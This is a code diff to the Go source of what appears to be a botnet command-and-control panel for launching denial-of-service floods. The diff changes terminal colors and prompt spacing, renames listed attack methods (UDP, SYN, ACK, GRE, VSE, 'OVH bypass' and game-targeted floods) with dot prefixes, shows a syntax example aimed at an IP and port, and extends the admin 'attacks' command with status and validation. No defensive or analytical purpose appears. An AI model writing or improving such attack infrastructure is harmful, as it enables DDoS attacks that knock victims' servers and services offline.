@@ -24,13 +24,13 @@ const (
 	ansiPrimary   = "\x1b[37m" // light gray
 	ansiCommands  = "\x1b[97m" // bright white
 	ansiPrompt    = "\x1b[35m" // purple
-	ansiPath      = "\x1b[90m" // soft gray
+	ansiPath      = "\x1b[97m" // bright white
 	ansiSuccess   = "\x1b[92m" // neon green
 	ansiSystem    = "\x1b[95m" // violet
 	ansiNumbers   = "\x1b[36m" // cyan
 	ansiWarning   = "\x1b[33m" // yellow
 	ansiError     = "\x1b[31m" // red
-	ansiSeparator = "\x1b[90m" // dark gray
+	ansiSeparator = "\x1b[97m" // bright white
 	ansiBlink     = "\x1b[5m"
 )
 
@@ -339,7 +339,6 @@ func adminPrompt(session *Session) string {
 	}
 	pathStyled := pathBuilder.String() + ansiReset
 	return strings.Join([]string{
-		"\r\n",
 		ansiCommands, session.User.Username, ansiReset,
 		ansiSystem, "@", ansiReset,
 		ansiCommands, promptHost, ansiReset,
@@ -444,7 +443,12 @@ func Admin(conn net.Conn) {
 	conn.Write([]byte("\033[2J\033[1H"))
 	writeAdminHeader(conn, session.User.Username)
 
+	blankAfterCommand := false
 	for {
+		if blankAfterCommand {
+			conn.Write([]byte("\r\n"))
+		}
+
 		command, err := ReadWithHistory(
 			conn,
 			adminPrompt(session),
@@ -457,10 +461,16 @@ func Admin(conn net.Conn) {
 		}
 
 		conn.Write([]byte("\r\n"))
+		cmdName := strings.Split(strings.ToLower(command), " ")[0]
+		if cmdName == "clear" || cmdName == "cls" || cmdName == "c" {
+			blankAfterCommand = false
+		} else {
+			blankAfterCommand = true
+		}
 		session.History = append(session.History, command)
 
 		// Main command handling
-		switch strings.Split(strings.ToLower(command), " ")[0] {
+		switch cmdName {
 
 		// Clear command
 		case "clear", "cls", "c":
@@ -477,19 +487,19 @@ func Admin(conn net.Conn) {
 			})
 
 			rows := [][]string{
-				{"udpthread", ansiCommands + "udp flood with threads." + ansiReset},
-				{"synflood", ansiCommands + "tcp flood with syn flag." + ansiReset},
-				{"ackflood", ansiCommands + "tcp flood with ack flag." + ansiReset},
-				{"ppsflood", ansiCommands + "udp flood for high packets per seconds." + ansiReset},
-				{"sackflood", ansiCommands + "customer ack flood." + ansiReset},
-				{"tcpsocket", ansiCommands + "tcp flood for high connections per seconds" + ansiReset},
-				{"tcpstream", ansiCommands + "tcp custom flood for bypassing." + ansiReset},
-				{"stdhex", ansiCommands + "udp flood with random hex." + ansiReset},
-				{"stomp", ansiCommands + "stomp flood." + ansiReset},
-				{"vseflood", ansiCommands + "value source engine flood." + ansiReset},
-				{"greip", ansiCommands + "gre ip flood." + ansiReset},
-				{"tcpwra", ansiCommands + "tcp custom flood for games." + ansiReset},
-				{"ovh", ansiCommands + "tcp flood optimized for OVH bypass." + ansiReset},
+				{".udpthread", ansiCommands + "udp flood with threads." + ansiReset},
+				{".synflood", ansiCommands + "tcp flood with syn flag." + ansiReset},
+				{".ackflood", ansiCommands + "tcp flood with ack flag." + ansiReset},
+				{".ppsflood", ansiCommands + "udp flood for high packets per seconds." + ansiReset},
+				{".sackflood", ansiCommands + "customer ack flood." + ansiReset},
+				{".tcpsocket", ansiCommands + "tcp flood for high connections per seconds" + ansiReset},
+				{".tcpstream", ansiCommands + "tcp custom flood for bypassing." + ansiReset},
+				{".stdhex", ansiCommands + "udp flood with random hex." + ansiReset},
+				{".stomp", ansiCommands + "stomp flood." + ansiReset},
+				{".vseflood", ansiCommands + "value source engine flood." + ansiReset},
+				{".greip", ansiCommands + "gre ip flood." + ansiReset},
+				{".tcpwra", ansiCommands + "tcp custom flood for games." + ansiReset},
+				{".ovh", ansiCommands + "tcp flood optimized for OVH bypass." + ansiReset},
 				{"", ""},
 				{"syntax", ansiCommands + ".stdhex 1.1.1.1 60 dport=80" + ansiReset},
 			}
@@ -526,21 +536,36 @@ func Admin(conn net.Conn) {
 
 		case "attacks": // Enable/Disable attacks possible.
 			args := strings.Split(strings.ToLower(command), " ")[1:]
-			if !session.User.Admin || len(args) == 0 {
+			if !session.User.Admin {
 				session.Conn.Write([]byte(ansiWarning + "Only admin can use this command." + ansiReset + "\r\n"))
+				continue
+			}
+			if len(args) == 0 {
+				status := ansiWarning + "disabled" + ansiReset
+				if Attacks {
+					status = ansiSuccess + "enabled" + ansiReset
+				}
+				session.Conn.Write([]byte(ansiSystem + "Attacks are currently " + status + "\r\n" + ansiReset))
+				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": attacks enable|disable|global <n>|reset_user <user>\r\n"))
 				continue
 			}
 
 			switch strings.ToLower(args[0]) {
 
-			case "enable", "active", "attacks": // Enable attacks
+			case "enable", "enabled", "active", "on", "attacks": // Enable attacks
 				Attacks = true
 				session.Conn.Write([]byte(ansiSuccess + "Attacks are now enabled!" + ansiReset + "\r\n"))
-			case "disable", "!attacks": // Disable attacks
+			case "disable", "disabled", "off", "!attacks": // Disable attacks
 				Attacks = false
 				session.Conn.Write([]byte(ansiWarning + "Attacks are now disabled!" + ansiReset + "\r\n"))
+			case "status":
+				status := ansiWarning + "disabled" + ansiReset
+				if Attacks {
+					status = ansiSuccess + "enabled" + ansiReset
+				}
+				session.Conn.Write([]byte(ansiSystem + "Attacks are currently " + status + "\r\n" + ansiReset))
 
-			case "global": // Change max cap
+			case "global":
 				if len(args[1:]) == 0 {
 					session.Conn.Write([]byte(ansiWarning + "Include a new int for max." + ansiReset + "\r\n"))
 					continue
@@ -549,6 +574,11 @@ func Admin(conn net.Conn) {
 				new, err := strconv.Atoi(args[1])
 				if err != nil {
 					session.Conn.Write([]byte(ansiWarning + "Include a new int for max." + ansiReset + "\r\n"))
+					continue
+				}
+
+				if new < 0 {
+					session.Conn.Write([]byte(ansiWarning + "Value cannot be negative." + ansiReset + "\r\n"))
 					continue
 				}
 
@@ -572,6 +602,9 @@ func Admin(conn net.Conn) {
 				}
 
 				session.Conn.Write([]byte(ansiSuccess + "Attack logs reset for that user" + ansiReset + "\r\n"))
+			default:
+				session.Conn.Write([]byte(ansiWarning + "Unknown attacks command." + ansiReset + "\r\n"))
+				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": attacks enable|disable|status|global <n>|reset_user <user>\r\n"))
 			}
 
 			continue
